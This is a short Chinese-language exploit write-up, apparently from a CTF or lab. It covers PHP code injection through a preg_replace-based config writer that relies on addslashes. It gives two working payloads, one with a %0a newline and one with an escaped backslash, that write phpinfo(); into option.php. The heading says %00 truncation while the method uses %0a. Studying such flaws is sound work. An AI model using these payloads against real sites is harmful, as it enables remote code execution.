### 漏洞成因
- %00截断
### 源码
index.php
```php
<?php
$str = addslashes($_GET['option']);
$file = file_get_contents('xxxxx/option.php');
$file = preg_replace('|\$option=\'.*\';|', "\$option='$str';", $file);
file_put_contents('xxxxx/option.php', $file);
```
xxxxx/option.php
```php
$option='test';
```
### Solution
首先查看正则匹配的是啥
![](Pasted%20image%2020230514153830.png)
流程如下：
1. 对传入的option参数进行addslashes，比如有单引号`'`，会变成`\'`
2. 通过正则匹配xxxxx/option.php中的`$option='xxx';`，将xxx的内容替换为经第一步处理的值
3. 替换完成，将其写入xxxxx/option.php。
主要使用 `%0a` （换行符）来截断 `\'`（addslashes）
先访问：
```php
?option=aaa';%0aphpinfo();//
```
经过addslashes后，$str值为 `aaa\';%0aphpinfo();//`
进行正则匹配并写入文件，xxxxx/option.php的内容变为:
```php
<?php 
$option='aaa\';
phpinfo();//';
?>
```
正则匹配时，会将两个单引号里的内容即 `aaa\` ，替换为 `xxx`，此时xxxxx/option.php的内容变为
```php
<?php
$option='xxx';
phpinfo();//';
?>
```

### Solution第二种
```
?option=aaa\';phpinfo();//
```
经过addslashes后，`$str为 aaa\\\';phpinfo();//`
经过preg_replace正则匹配后，对`\`做了转义处理`,xxxxx/option.php`的内容变为：
```php
<?php 
$option='aaa\\';phpinfo();//';
?>
```